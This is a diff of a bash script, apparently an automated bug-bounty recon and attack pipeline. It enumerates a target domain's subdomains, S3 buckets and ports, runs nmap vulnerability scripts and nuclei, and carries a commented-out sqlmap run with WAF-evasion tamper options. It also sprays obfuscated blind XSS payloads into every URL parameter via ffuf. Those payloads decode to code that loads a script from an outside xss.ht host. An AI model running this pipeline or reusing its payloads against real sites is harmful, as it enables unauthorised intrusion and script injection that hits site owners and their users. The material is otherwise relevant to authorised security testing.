@@ -4,26 +4,26 @@
 if [ -z "$1" ]
   then
     echo "Target domain not supplied"
-    echo "Usage : trozon target.com filename"
+    echo "Usage : trozonreco target.com filename"
     exit 1
 fi
 
 if [ -z "$2" ]
   then
     echo "Output filename not supplied"
-    echo "Usage : trozon target.com filename"
+    echo "Usage : trozonreco target.com filename"
     exit 1
 fi
 
 if [ -z "$3" ]
   then
     echo "Tool not supplied either use waybackurls or gau"
-    echo "Usage : trozon target.com filename waybackurls or gau"
+    echo "Usage : trozonreco target.com filename waybackurls or gau"
     exit 1
 fi
 
 if [ ! -d "$2" ]; then
-	cd /var/www/html/
+        cd /var/www/html/
         mkdir $2
 fi
 
@@ -49,7 +49,6 @@ sleep 2
 
 echo -e "${NORMAL}Starting ${GREEN}Assetfinder${NORMAL} on $1..." | notify
 assetfinder --subs-only $1 |sort -u > $2-assetfinder.txt
-pwd
 sleep 2
 
 echo -e "${NORMAL}Starting ${GREEN}Sublist3r${NORMAL} on $1..." | notify
@@ -64,13 +63,41 @@ echo -e "${BOLD}\nFiltering subdomains of ${RED}$1... \n ${NORMAL} " | notify
 cat $2-sublister.txt $2-subfinder.txt $2-assetfinder.txt |grep -v "*" |sort -u > $2-finalsubdomains.txt
 sleep 2
 
+echo -e "${BOLD}\nBruteforcing for s3 Buckets on ${RED}$1... \n ${NORMAL} " | notify
+ruby ~/tools/lazys3/lazys3.rb $1 > $2-s3_buckets
+sleep 2
+
+#echo -e "${BOLD}\nRunning AltDns on ${RED}$1... \n ${NORMAL} " | notify
+#altdns -i $2-finalsubdomains.txt -o $2-data_output -w ~/wordlist/altdns.txt -r -s $2-results_output.txt
+#sleep 2
+
+echo -e "${BOLD}\nRunning ShuffleDNS for Resolving on ${RED}$1... \n ${NORMAL} " | notify
+shuffledns -d $1 -list $2-finalsubdomains.txt -r ~/wordlist/dns-resolvers.txt -o $2-resolved_subs.txt
+sleep 2
+
+echo -e "${BOLD}\nRunning ShuffleDNS for Brutefore on ${RED}$1... \n ${NORMAL} " | notify
+shuffledns -d $1 -list $2-finalsubdomains.txt -w ~/wordlist/subdomains-top1million-20000.txt -r ~/wordlist/dns-resolvers.txt -o $2-bruteforced_subs.txt
+cat $2-bruteforced_subs.txt | httpx -title -status-code > $2-bruteforced_subs_Httpx.txt
+sleep 2
+
+echo -e "${BOLD}\nRunning Naabu on ${RED}$1... \n ${NORMAL} " | notify
+naabu -silent -il $2-finalsubdomains.txt > portscan.txt
+sleep 2
+
+echo -e "${BOLD}\nRunning nmap on ${RED}$1... \n ${NORMAL} " | notify
+nmap -Pn -T4 -A -v --script vuln -iL $2-finalsubdomains.txt -oN nmap_vuln_results.txt
+sleep 2
+
+#echo -e "${BOLD}\nRunning ffuf on ${RED}$1... \n ${NORMAL} " | notify
+#mkdir /var/www/html/$2/ffuf
+#for i in $(cat $2-finalsubdomains.txt); do ffuf -u $i/FUZZ -w ~/wordlist/dicc.txt -c -e php,txt,asp,html,aspx > /var/www/html/$2/ffuf/$i.txt; done
+sleep 2
 
 echo -e "${NORMAL}Starting ${GREEN}Httprobe${NORMAL} on all filtered subdomains..." | notify
 cat $2-finalsubdomains.txt | sort -u | uniq -u | httprobe > $2-alive.txt
 sleep 2
 
 echo -e "${NORMAL}Starting ${GREEN}Get-titles${NORMAL} to collect all titles of all subdomains..." | notify
-pwd
 cat $2-alive.txt | httpx -title > $2-gettitle.txt
 sleep 2
 
@@ -86,8 +113,9 @@ aquatone-takeover -d $1
 sleep 2
 
 echo -e "Starting ${GREEN}Running Aquatone for Screenshots ${NORMAL} on $1... ${NORMAL}" | notify
-cat $2-alive.txt | aquatone -chrome-path /snap/bin/chromium -out $2-aqua_out/ -threads 5 -silent &> /dev/null
-chmod 777 $2-aqua_out/screenshots/http*
+cat $2-alive.txt | aquatone -chrome-path /snap/bin/chromium -out ~/aqua-temp/$2-aqua-out/ -screenshot-timeout 60000 -ports xlarge -threads 5 -silent -scan-timeout 2000
+mv ~/aqua-temp/$2-aqua-out/ /var/www/html/$2/
+chmod 777 $2-aqua-out/screenshots/http*
 sleep 2
 
 echo -e "Starting ${GREEN}Running Hakrawler and Paramspider ${NORMAL} on $1... ${NORMAL} " | notify
@@ -99,12 +127,13 @@ rm -rf output/
 sleep 2
 
 echo -e "${NORMAL}${BOLD}Starting ${GREEN}$3${NORMAL}${BOLD} param output on $1... ${NORMAL} " | notify
-pwd
 sleep 2
 cat $2-finalsubdomains.txt | $3 > $2-$3_all.txt
 
 sleep 2
 cat $2-$3_all.txt | qsreplace 'FUZZ' | sort -u | tee $2-$3.txt
+
+
 
 echo -e "Starting ${GREEN}XSS${NORMAL} param filtering on $1... ${NORMAL} " | notify
 sleep 2
@@ -128,23 +157,23 @@ cat $2-$3.txt | gf sqli > $2-sqli.txt
 
 echo -e "Starting ${GREEN}LFI${NORMAL} param filtering on $1... ${NORMAL} " | notify
 sleep 2
-cat $2-$3.txt | gf sqli > $2-lfi.txt
+cat $2-$3.txt | gf lfi > $2-lfi.txt
 
 echo -e "Starting ${GREEN}RCE${NORMAL} param filtering on $1... ${NORMAL} " | notify
 sleep 2
-cat $2-$3.txt | gf sqli > $2-rce.txt
+cat $2-$3.txt | gf rce > $2-rce.txt
 
 echo -e "Starting ${GREEN}Directory Fuzzing${NORMAL} on $1... ${NORMAL} " | notify
 sleep 2
-cat $2-gettitle.txt | grep 'Not Found\|Moved Permanently\|403 - Forbidden\|404\|403\|Apache\|Service Unavailable\|403\|Demo\|test\|dev\|Welcome\|FTP Root\|Access Denied' | cut -d ' ' -f 1 | tee $2-juicydomains.txt 
+cat $2-gettitle.txt | grep 'Not Found\|Moved Permanently\|403 - Forbidden\|404\|403\|Apache\|Service Unavailable\|403\|Demo\|test\|dev\|Welcome\|FTP Root\|Access Denied' | cut -d ' ' -f 1 | tee $2-juicysubdomains.txt
+#python3 ~/tools/dirsearch/dirsearch.py -u $1 -t 20 -x 500 -e asp,aspx,htm,html,gz,tgz,zip,txt,php,pl,tar,action,do --exclude-status = 301,400,403,500-999 > $2-dirsearch.txt 
 sleep 2
-cat '$2' | while read url;do ffuf -w ~/wordlist/dicc.txt -u $url/FUZZ -recursion -mc 200 \n; done >> $2-Dirfuzz.txt
-cat $2-gettitle.txt | grep 'Not Found\|Moved Permanently\|403 - Forbidden\|404\|403\|Apache\|Service Unavailable\|403\|Demo\|test\|dev\|Welcome\|FTP Root\|Access Denied' | cut -d ' ' -f 1 | while read url;do ~/tools/dirsearch/dirsearch.py dir -u $url/ -e php,log,sql,gz,zip,aspx,docx,pdf,txt,js,json; done | tee $2-Dirsearch.txt
 
 echo -e "Starting ${GREEN}Nuclei ${NORMAL} on $1... ${NORMAL} " | notify
 sleep 2
+nuclei --update-templates
 cat $2-finalsubdomains.txt | nuclei -t ~/nuclei-templates/  --severity medium,high,critical | tee $2-subdomains-nuclei.txt | notify
-cat $2-$3.txt | nuclei -t ~/nuclei-templates/  --severity medium,high,critical | tee $2-wayback-nuclei.txt | notify
+#cat $2-$3.txt | nuclei -t ~/nuclei-templates/  --severity medium,high,critical | tee $2-wayback-nuclei.txt | notify
 
 echo -e "Starting ${GREEN}Hakrawler for js files ${NORMAL} on $1... ${NORMAL} " | notify
 sleep 2
@@ -154,14 +183,22 @@ echo -e "Starting ${GREEN}Hakrawler for Links ${NORMAL} on $1... ${NORMAL} " | n
 sleep 2
 hakrawler -depth 4 -js -linkfinder -plain -url $1 | tee $2-jslinks.txt
 
-echo -e "Starting ${GREEN}SQLMap${NORMAL} on $1... ${NORMAL} " | notify
+echo -e "Starting ${GREEN} JSFinder for URLS ${NORMAL} on $1... ${NORMAL} " | notify
+python3 ~/tools/JSFinder/JSFinder.py -u $1 -ou $2_url.txt
 sleep 2
-~/tools/sqlmap-dev/sqlmap.py -m $2-sqli.txt --dbs --batch --level=3 --risk=3 --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,ifnull2ifisnull,modsecurityversioned > $2-sqlmapresult.txt
+
+echo -e "Starting ${GREEN} JSFinder for Links ${NORMAL} on $1... ${NORMAL} " | notify
+python3 ~/tools/JSFinder/JSFinder.py -u $1 -os $2_subdomain.txt
+sleep 2
+
+#echo -e "Starting ${GREEN}SQLMap${NORMAL} on $1... ${NORMAL} " | notify
+#sleep 2
+#~/tools/sqlmap-dev/sqlmap.py -m $2-sqli.txt --dbs --batch --level=3 --risk=3 --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,ifnull2ifisnull,modsecurityversioned > $2-sqlmapresult.txt
 
 echo -e "Starting ${GREEN}XSSHunter${NORMAL} on $1... ${NORMAL} " | notify
 sleep 2
 cat $2-$3.txt | grep '=' | Gxss | dalfox pipe | tee $2-xssresult.txt
-cat $2-$3.txt | grep '=' | qsreplace '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vdHJvem9uLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>' | tee $2-xsshunterforfuzz.txt 
+cat $2-$3.txt | grep '=' | qsreplace '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vdHJvem9uLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>' | tee $2-xsshunterforfuzz.txt
 ffuf -u FUZZ -w $2-xsshunterforfuzz.txt -r
 rm -r $2-xsshunterforfuzz.txt
 
@@ -177,7 +214,7 @@ rm -r $2-xsshunterforfuzz.txt -r
 
 sleep 2
 cat $2-$3.txt | grep '=' | qsreplace '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vdHJvem9uLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; autofocus>' | tee $2-xsshunterforfuzz.txt
-ffuf -u FUZZ -w $2-xsshunterforfuzz.txt -r 
+ffuf -u FUZZ -w $2-xsshunterforfuzz.txt -r
 rm -r $2-xsshunterforfuzz.txt
 
 sleep 2
@@ -211,4 +248,4 @@ blc -rof --filter-level 3 https://$1/ | tee $2-brokenlinks.txt
 
 sleep 2
 echo -e "${BOLD}\nAll your outputs are save in ${GREEN}$2/\n" | notify
-echo -e "THANK YOU FOR USING TROZORECON ${NORMAL}" | notify 
+echo -e "THANK YOU FOR USING TROZORECON ${NORMAL}" | notify
